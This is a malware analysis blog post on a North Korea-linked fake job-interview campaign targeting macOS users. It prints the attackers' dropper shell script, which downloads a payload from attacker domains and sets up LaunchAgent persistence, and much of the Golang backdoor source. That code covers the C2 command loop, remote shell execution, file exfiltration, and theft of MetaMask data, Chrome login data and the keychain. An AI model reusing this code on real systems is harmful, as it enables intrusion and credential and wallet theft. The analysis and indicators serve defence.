---
title: North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign
by: dmpdump
tags: malware chrome golang
---

On December 28, 2024, [@tayvano_](https://x.com/tayvano_) shared a [great thread](https://x.com/tayvano_/status/1872980013542457802) on X describing activity consistent with what is typically known as the "Contagious Interview" campaign conducted by North Korea-nexus threat actors. In the activity, victims were contacted via platforms such as LinkedIn and were offered a job interview. Victims were sent a link to sites impersonating the legitimate [Willo](https://www.willo.video/) candidate screening site. The fake sites eventually displayed a fake error and provided users with a malicious fix, such as the following [command](https://x.com/tayvano_/status/1872980032752415227). The victims are lured into copying/pasting the command on their devices, triggering the download and installation of the payload. This type of activity has been very common in the cybercrime scene in the last year, typically leading to RATs, and lately to LummaC2 Stealer. The Contagious Interview activity, though, has a different intent. It is typically conducted to drain cryptocurrency wallets. There are dozes of reports estimating the millions that North Korean threat actors have made in cryptocurrency heists. [@500mk500](https://x.com/500mk500/status/1873034624122909159) subsequently did some really nice discovery of related domains impersonating Willo. @tayvano_ was kind enough to share a hash from this campaign with me, so I took a look at the payload.

* File Name: VCam_intel.zip
* Hash: 60ec2dbe8cfacdff1d4eb093032b0307e52cc68feb1f67487d9f401017c3edd7

The file contained Golang source code and a Chrome Update Mach-O app, and had very low detection:

![sshot](/assets/images/dprk_chrome/lowdetect.png)

Pivoting on the hash, I found related files and domains. At least one of the download domains was https://www.api.camera-drive\[.\]cloud/result/VCam_intel.zip. I also found a ZIP file containing a collection of artifacts from the campaign (hash: 60ec2dbe8cfacdff1d4eb093032b0307e52cc68feb1f67487d9f401017c3edd7).

![sshot](/assets/images/dprk_chrome/pivot.png)

ZIP file with a collection of artifacts:
![sshot](/assets/images/dprk_chrome/parentzip.png)

This ZIP file contains artifacts to target Windows, Mac, and Linux, which is consistent with the multi-platform targeting of this threat actor and the use of cross-platform languages such as Golang. I'll focus on the artifacts affecting Mac users. The script executed in the "fake fix" lure is likely `ffmpeg.sh`. This shell script triggers the download, execution, and persistence of the payload, along with a Mach-O app.

`ffmpeg.sh` does a few things:
* It defines variables, that can be updated with different file names and domains
* It has code to determine if the target system is running on the Intel or ARM architecture, and download the corresponding payload
* It downloads and unpacks an archive (which is the archive originally by @tayvano_)
* It establishes a persistent LaunchAgent service for the malware
* It runs a the ChromeUpdateAlert.app Mach-O application

```shell
#!/bin/bash

# Define variables for URLs
ZIP_URL_ARM64="https://api.nvidia-cloud[.]online/VCam1.update"
ZIP_URL_INTEL="https://api.nvidia-cloud[.]online/VCam2.update"
ZIP_FILE="/var/tmp/VCam.zip"                        # Path to save the downloaded ZIP file
WORK_DIR="/var/tmp/VCam"                            # Temporary directory for extracted files
EXECUTABLE="vcamservice.sh"                         # Replace with the name of the executable file inside the ZIP
APP="ChromeUpdateAlert.app"                         # Replace with the name of the app to open
PLIST_FILE=~/Library/LaunchAgents/com.vcam.plist    # Path to the plist file

# Determine CPU architecture
case $(uname -m) in
    arm64) ZIP_URL=$ZIP_URL_ARM64 ;;    
    x86_64) ZIP_URL=$ZIP_URL_INTEL ;;
    *) exit 1 ;;  # Exit for unsupported architectures
esac

# Create working directory
mkdir -p "$WORK_DIR"

# Function to clean up
cleanup() {
    rm -rf "$ZIP_FILE"
}

# Download, unzip, and execute
if curl -s -o "$ZIP_FILE" "$ZIP_URL" && [[ -f "$ZIP_FILE" ]]; then
    unzip -o -qq "$ZIP_FILE" -d "$WORK_DIR"
    if [[ -f "$WORK_DIR/$EXECUTABLE" ]]; then
        chmod +x "$WORK_DIR/$EXECUTABLE"
    else
        cleanup
        exit 1
    fi
else
    cleanup
    exit 1
fi

# Step 4: Register the service
mkdir -p ~/Library/LaunchAgents

cat > "$PLIST_FILE" <<EOL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.vcam</string>
    <key>ProgramArguments</key>
    <array>
        <string>$WORK_DIR/$EXECUTABLE</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
EOL

chmod 644 "$PLIST_FILE"

if ! launchctl list | grep -q "com.vcam"; then
    launchctl load "$PLIST_FILE"
fi

# Step 5: Run ChromeUpdateAlert.app
if [[ -d "$WORK_DIR/$APP" ]]; then
    open "$WORK_DIR/$APP" &
fi

# Final cleanup
cleanup
```
The shell script set in the `EXECUTABLE="vcamservice.sh" ` variable has a key role in the execution and persistence of the malicious Golang payload. It has a fake "Installing dependencies" message and it runs `app.go` with the `go run` command, which builds and runs the Golang project from the source code.

```shell
#!/bin/bash

# Set the working directory to the folder where this script is located
cd "$(dirname "$0")"

echo "Installing Dependencies..."

project_file="app.go"
./bin/go run "$project_file"

exit 0
```
# Golang Backdoor/Stealer

VCam_intel.zip contains various source code artifacts for the malicious Golang payload, the Chrome Update Mach-O, and the shell script for the build/execution of the Golang malware.

![sshot](/assets/images/dprk_chrome/vcamcontent.png)

We can start reviewing the Golang payload from the app.go source file. This file contains two functions.

`RunDll`: In our case it does not run any DLLs, it simply sets the C2 url (http://216.74.123\[.\]191:8080), it checks if there is another instance of the malware running, it generates a random id, which is written to disk in a `.host` file in the temp folder, and it starts the main execution loop in a function called `StartMainLoop`.  
`generateId`: This generates a random id for each victim.

```golang
func generateId() string {
	hostfile := filepath.Join(os.TempDir(), config.MACHINEID_FILE_NAME)
	data, err := os.ReadFile(hostfile)

	if err == nil {
		return string(data)
	}

	// initialize id
	data = make([]byte, 4)
	rand.Read(data)

	id := hex.EncodeToString(data)

	os.WriteFile(hostfile, []byte(id), 0o644)

	return id
}


func RunDLL() {
	print("================= RunDLL =================\n")
	instance.Delay()
	instance.CheckDupInstance()
	instance.RegisterInstance()

	//url := "https://api.jz-aws[.]info/public/images/" 
	 url := "http://216.74.123[.]191:8080"
	// url := "http://127.0.0.1:8080"
	id := generateId()  
	fmt.Printf("UUID: %s, URL: %s\n", id, url)

	core.StartMainLoop(id, url)
}

//export DllRegisterServer
// func DllRegisterServer() {
// 	RunDLL()
// }

// main
func main() {

	RunDLL()
}
```
Of interest, we can see various code artifacts that are commented out, including a domain (https://api.jz-aws\[.\]info/public/images/) which was previously reported by [Sonatype](https://www.sonatype.com/blog/cors-parser-npm-package-hides-cross-platform-backdoor-in-png-files) in the context of a trojanized npm package.

The main loop of the backdoor/stealer receives 2 string arguments, the random id and the C2 URL. It implements a persistent connection to the C2 and accepts the following commands, which have constants assigned to them in a configuration file. The commands slice byte arrays provided from the C2 and use the slices for specific command actions (e.g. specifying a path for the file upload/download, or a command execution mode).

| Command    | Command Constant    | Action   |
|-------------|-------------|-------------|
| COMMAND_INFO | qwer | Returns username, hostname, OS, and architecture |
| COMMAND_UPLOAD | asdf | Drops and decompresses a file to a specific path |
| COMMAND_DOWNLOAD | zxcv | Gets files or directories. If it is a directory, it compresses it as .tar.gz |
| COMMAND_OSSHELL | vbcx | Runs commands in 2 modes (SHELL_MODE_WAITGETOUT and SHELL_MODE_DETACH). WAITGETOUT waits for completion, DETACH does not |
| COMMAND_AUTO | r4ys | Core Chrome stealer command, with various sub-commands described below |
| COMMAND_WAIT | ghdj | Sleeps for a specific amount of time |
| COMMAND_EXIT | dghh | Returns an "exited" message |

```golang
package core

import (
	"bits-project/bits/auto"
	"bits-project/bits/command"
	"bits-project/bits/config"
	"bits-project/bits/transport"
	"bits-project/bits/util"
	"bytes"
	"context"
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func StartMainLoop(id string, url string) {

	var (
		msg_type string
		msg_data [][]byte
		msg      string
		cmd      string
		cmd_type string
		cmd_data [][]byte
		alive    bool
	)

	// initialize
	cmd_type = config.COMMAND_INFO
	alive = true
	for alive {
		func() {

			// recover panic state
			defer func() {
				if r := recover(); r != nil {
					cmd_type = config.COMMAND_INFO
					time.Sleep(config.DURATION_ERROR_WAIT)
				}
			}()

			switch cmd_type {
			case config.COMMAND_INFO:
				msg_type, msg_data = processInfo()
			case config.COMMAND_UPLOAD:
				msg_type, msg_data = processUpload(cmd_data)
			case config.COMMAND_DOWNLOAD:
				msg_type, msg_data = processDownload(cmd_data)
			case config.COMMAND_OSSHELL:
				msg_type, msg_data = processOsShell(cmd_data)
			case config.COMMAND_AUTO:
				msg_type, msg_data = processAuto(cmd_data)
			case config.COMMAND_WAIT:
				msg_type, msg_data = processWait(cmd_data)
			case config.COMMAND_WAIT:
				alive = false
				msg_type, msg_data = processExit()
			default:
				panic("problem")
			}

			msg = command.MakeMsg(id, msg_type, msg_data)
			cmd, _ = transport.HtxpExchange(url, msg)
			cmd_type, cmd_data = command.DecodeMsg(cmd)
		}()
	}
}

func processExit() (string, [][]byte) {
	return config.MSG_LOG, [][]byte{
		[]byte(config.LOG_SUCCESS),
		[]byte("exited"),
	}
}

func processAuto(data [][]byte) (string, [][]byte) {
	var (
		msg_type string
		msg_data [][]byte
	)

	mode := string(data[0])

	switch mode {
	case config.AUTO_CHROME_GATHER:
		msg_type, msg_data = auto.AutoModeChromeGather()
	case config.AUTO_CHROME_PREFRST:
		msg_type, msg_data = auto.AutoModeChromeChangeProfile()
	case config.AUTO_CHROME_COOKIE:
		msg_type, msg_data = auto.AutoModeChromeCookie()
	case config.AUTO_CHROME_KEYCHAIN:
		msg_type, msg_data = auto.AutoModeMacChromeLoginData()
	default:
		msg_type = config.MSG_LOG
		msg_data = [][]byte{[]byte(config.LOG_FAIL), []byte("unknown auto mode")}
	}

	return msg_type, msg_data
}

func processOsShell(data [][]byte) (string, [][]byte) {

	mode := string(data[0]) // mode
	timeout, _ := strconv.ParseInt(string(data[1]), 16, 64)
	shell := string(data[2])
	args := make([]string, len(data[3:]))
	for index, elem := range data[3:] {
		args[index] = string(elem)
	}

	if mode == config.SHELL_MODE_WAITGETOUT { // wait and get result mode

		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout))
		defer cancel()

		cmd := exec.CommandContext(ctx, shell, args...)
		out, err := cmd.Output()

		if err != nil {
			return config.MSG_LOG, [][]byte{
				[]byte(config.LOG_FAIL),
				[]byte(err.Error()),
			}
		} else {
			return config.MSG_LOG, [][]byte{
				[]byte(config.LOG_SUCCESS),
				out,
			}
		}

	} else { // start and detach mode

		c := exec.Command(shell, args...)
		err := c.Start()

		if err != nil {
			return config.MSG_LOG, [][]byte{
				[]byte(config.LOG_FAIL),
				[]byte(err.Error()),
			}
		} else {
			return config.MSG_LOG, [][]byte{
				[]byte(config.LOG_SUCCESS),
				[]byte(fmt.Sprintf("%s %s", shell, strings.Join(args, " "))),
			}
		}
	}

}

func processDownload(data [][]byte) (string, [][]byte) {

	var file_data []byte
	var err error

	path := string(data[0])
	_, file := filepath.Split(path)

	info, _ := os.Stat(path)

	if info.IsDir() {
		var buf bytes.Buffer
		err = util.Compress(&buf, []string{path}, false)

		file = fmt.Sprintf("%s.tar.gz", file)
		file_data = buf.Bytes()

	} else {
		file_data, err = os.ReadFile(path)
	}

	if err == nil {
		return config.MSG_FILE, [][]byte{[]byte(config.LOG_SUCCESS), []byte(file), file_data}
	} else {
		return config.MSG_FILE, [][]byte{[]byte(config.LOG_FAIL), []byte(err.Error())}
	}
}

func processWait(data [][]byte) (string, [][]byte) {

	duration, _ := strconv.ParseInt(string(data[0]), 16, 64)

	time.Sleep(time.Duration(duration))

	send_data := make([]byte, 128)
	rand.Read(send_data)

	return config.MSG_PING, [][]byte{send_data}
}

func processUpload(data [][]byte) (string, [][]byte) {

	var log string
	var state string

	path := string(data[0])
	buf := bytes.NewBuffer(data[1])

	err := util.Decompress(buf, path)

	if err == nil {
		log = fmt.Sprintf("%s : %d", path, len(data[1]))
		state = config.LOG_SUCCESS
	} else {
		log = fmt.Sprintf("%s : %s", path, err.Error())
		state = config.LOG_FAIL
	}

	return config.MSG_LOG, [][]byte{
		[]byte(state),
		[]byte(log),
	}
}

func processInfo() (string, [][]byte) {

	user, _ := user.Current()
	host, _ := os.Hostname()
	os := runtime.GOOS
	arch := runtime.GOARCH

	print("user: " + user.Username + ", host: " + host + ", os: " + os + ", arch: " + arch + "\n")

	data := [][]byte{
		[]byte(user.Username),
		[]byte(host),
		[]byte(os),
		[]byte(arch),
		[]byte(config.DAEMON_VERSION),
	}

	return config.MSG_INFO, data
}
```
# Stealer Activity

COMMAND_AUTO ("r4ys") can execute various stealer sub-commands:

* AUTO_CHROME_GATHER ("89io")

This command walks the Chrome user data directory, with a path dependent on the operating system, and it locates a file that matches the name `nkbihfbeogaeaoehlefnkodbefgpgknn` in the `Local Extension Settings` folder. If found, it compresses and returns its content as `gather.tar.gz`. This seems to be targeting the MetaMask Wallet extension.

```golang
func AutoModeChromeGather() (string, [][]byte) {
	print("===========	AutoModeChromeGather ===========", runtime.GOOS, "\n")
	
	var (
		buf          bytes.Buffer
		userdata_dir string
		path_list    []string
	)

	// gather
	userdata_dir = getUserdataDir()

	// file system search
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == extension_dir && strings.Contains(path, "Local Extension Settings") {
			path_list = append(path_list, path)
		}
		return nil
	})

	_ = util.Compress(&buf, path_list, true)

	print("===========	End ===========\n")

	// return
	data := make([][]byte, 3)
	data[0] = []byte(config.LOG_SUCCESS)
	data[1] = []byte("gather.tar.gz")
	data[2] = buf.Bytes()
	msg_type := config.MSG_FILE

	return msg_type, data
}
```

* AUTO_CHROME_PREFRST ("7ujm")

This command allows for the update of Chrome preferences. It locates the user directory, searches for Chrome's `Secure Preferences` file, kills Chrome, and uses the [gabs](https://github.com/Jeffail/gabs) library to edit the `Secure Preferences` JSON file. The edits seem to target settings for the MetaMask wallet, as it targets extension_hash_key `protection.macs.extensions.settings.nkbihfbeogaeaoehlefnkodbefgpgknn` and extension_setting_key `extensions.settings.nkbihfbeogaeaoehlefnkodbefgpgknn`. The updates include a new hash key and new settings via injected JSON content. This is likely used for the deployment of a malicious extension.

```golang
func AutoModeChromeChangeProfile() (string, [][]byte) {

	var path_list []string

	//get user data dir
	userdata_dir := getUserdataDir()

	// search and list prefs
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == secure_preference_file {
			path_list = append(path_list, path)
		}

		return nil
	})

	// chrome kill
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "taskkill /f /im chrome.exe")
		cmd.Run()
	} else {
		cmd := exec.Command("/bin/sh", "-c", "killall chrome")
		cmd.Run()
	}

	// change prefs
	changep, _ := gabs.ParseJSON([]byte(getExtJsonString()))
	for _, path := range path_list {
		prefp, err := gabs.ParseJSONFile(path)
		if err != nil {
			continue
		}

		ok := prefp.ExistsP(extension_hash_key)
		if !ok {
			continue
		}

		prefp.SetP(changep, extension_setting_key)
		prefp.SetP(getExtHash(), extension_hash_key)

		os.WriteFile(path, prefp.Bytes(), 0o644)
	}

	return config.MSG_LOG, [][]byte{[]byte(config.LOG_SUCCESS), []byte("chrome preference change")}
}

// get hash value
func getExtHash() string {

	if runtime.GOOS == "windows" {
		return "B4B0E19A98DEECCC9F9F7DC5F18999C1F2EAAE668F7968C96F7B1CB89C9B0FBD"
	} else {
		return "7A2DEA687C9AB3A86A82893014C926BBB82ECD27B446197559F7512DE9025DA5"
	}

}

// get json string
func getExtJsonString() string {
	return `{"active_permissions":{"api":["activeTab","clipboardWrite","notifications","storage","unlimitedStorage","webRequest"],"explicit_host":["*://*.eth/*","http://localhost:8545/*","https://*.codefi.network/*","https://*.cx.metamask.io/*","https://*.infura.io/*","https://chainid.network/*","https://lattice.gridplus.io/*"],"manifest_permissions":[],"scriptable_host":["*://connect.trezor.io/*/popup.html","file:///*","http://*/*","https://*/*"]},"commands":{"_execute_browser_action":{"suggested_key":"Alt+Shift+M","was_assigned":true}},"content_settings":[],"creation_flags":38,"events":[],"first_install_time":"13361518520188298","from_webstore":false,"granted_permissions":{"api":["activeTab","clipboardWrite","notifications","storage","unlimitedStorage","webRequest"],"explicit_host":["*://*.eth/*","http://localhost:8545/*","https://*.codefi.network/*","https://*.cx.metamask.io/*","https://*.infura.io/*","https://chainid.network/*","https://lattice.gridplus.io/*"],"manifest_permissions":[],"scriptable_host":["*://connect.trezor.io/*/popup.html","file:///*","http://*/*","https://*/*"]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13361518520188298","location":4,"newAllowFileAccess":true,"path":"C:\\ProgramData\\11.16.0_0","preferences":{},"regular_only_preferences":{},"state":1,"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}`
}
```

* AUTO_CHROME_COOKIE ("gi%#")

There are 3 functions defined for this command, dependent on the target operating system (chrome_cookie_darwin, chrome_cookie_win, and chrome_cookie_other). The macOS version of the command does not seem to implement the stealing of sensitive data, and it has various unused functions. The Windows version, however, does implement code for stealing sensitive browser data, such as login data. The stealer code seems to be based on projects such as [https://github.com/SaturnsVoid/Chrome-Password-Recovery/tree/master](https://github.com/SaturnsVoid/Chrome-Password-Recovery/tree/master) and [https://github.com/moonD4rk/HackBrowserData](https://github.com/moonD4rk/HackBrowserData).


* AUTO_CHROME_KEYCHAIN ("kyci")

This is the command used for mac targets (and not for other operating systems). It compresses and exfiltrates sensitive from the keychain and Chrome Login Data in `gatherchain.tar.gz`.

```golang
func AutoModeMacChromeLoginData() (string, [][]byte) {
	var (
		buf          bytes.Buffer
		userdata_dir string
		keychain_dir string
		path_list    []string
	)


	// gather
	userdata_dir = getUserdataDir()
	keychain_dir = getKeychainFileMacDir()
	// file system search
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == logins_data_file {
			path_list = append(path_list, path)
		}
		return nil
	})
	path_list = append(path_list, keychain_dir);

	_ = util.Compress(&buf, path_list, true)

	// return
	data := make([][]byte, 3)
	data[0] = []byte(config.LOG_SUCCESS)
	data[1] = []byte("gatherchain.tar.gz")
	data[2] = buf.Bytes()
	msg_type := config.MSG_FILE

	return msg_type, data
}

//uses:
func getKeychainFileMacDir() string {
	var home string
	var begine_path string

	home = os.Getenv("HOME")
	begine_path = filepath.Join(home, keychain_dir_darwin);

	return begine_path
}

//where keychain_dir_darwin is "Library/Keychains/login.keychain-db"
```
# ChromeUpdateAlert

During the initial execution of the infection chain, ChromeUpdateAlert.app, a Mach-O application, is also executed. I don't have an environment to test this app, but the decompiled code suggests that it displays a fake microphone alert which requests user authentication. The alert leads to an input field for the victim to provide the password, which seems to be exfiltrated to Dropbox using the Dropbox API.

This Mach-O application has no detection in VT:

![sshot](/assets/images/dprk_chrome/macholowdetect.png)

Fake authentication:
![sshot](/assets/images/dprk_chrome/fakeauth.png)

Password retrieval:

![sshot](/assets/images/dprk_chrome/getpassword.png)

The password seems to be exfiltrated as "password.txt" using the Dropbox API

![sshot](/assets/images/dprk_chrome/passwdtxt.png)

![sshot](/assets/images/dprk_chrome/DropboxAPI.png)


# Appendix - Configuration file of the Golang Backdoor/Stealer

```golang
package config

import "time"

const (
	MSG_INFO    = "fwe9" // user,host,os,arch
	MSG_LOG     = "1q2w" // status,logmsg
	LOG_SUCCESS = "true"
	LOG_FAIL    = "false"
	MSG_PING    = "poiu"  // random128byte
	MSG_FILE    = "qpwoe" // name, filedata

	COMMAND_INFO          = "qwer" // REQ: type | RES: info
	COMMAND_UPLOAD        = "asdf" // REQ: type, path, filedata | RES: log
	COMMAND_DOWNLOAD      = "zxcv" // REQ: type, path | RES: file
	COMMAND_OSSHELL       = "vbcx" // REQ: type, shell, timeout | RES: log
	SHELL_MODE_WAITGETOUT = "qmwn"
	SHELL_MODE_DETACH     = "qalp"
	COMMAND_WAIT          = "ghdj" // REQ: type, interval | RES: ping
	COMMAND_AUTO          = "r4ys" // REQ: type, mode | RES: log
	AUTO_CHROME_GATHER    = "89io"
	AUTO_CHROME_PREFRST   = "7ujm"
	AUTO_CHROME_COOKIE    = "gi%#"
	AUTO_CHROME_KEYCHAIN  = "kyci"
	COMMAND_EXIT          = "dghh" // REQ: type | RES: x

	DURATION_ERROR_WAIT = time.Minute * 5

	PID_FILE_NAME       = ".store"
	MACHINEID_FILE_NAME = ".host"

	DAEMON_VERSION = "2.0"
)
```

# IOCs
* Golang backdoor/stealer: 60ec2dbe8cfacdff1d4eb093032b0307e52cc68feb1f67487d9f401017c3edd7
* C2: http://216.74.123\[.\]191:8080
* ChromeUpdateAlert.app: b72653bf747b962c67a5999afbc1d9156e1758e4ad959412ed7385abaedb21b6 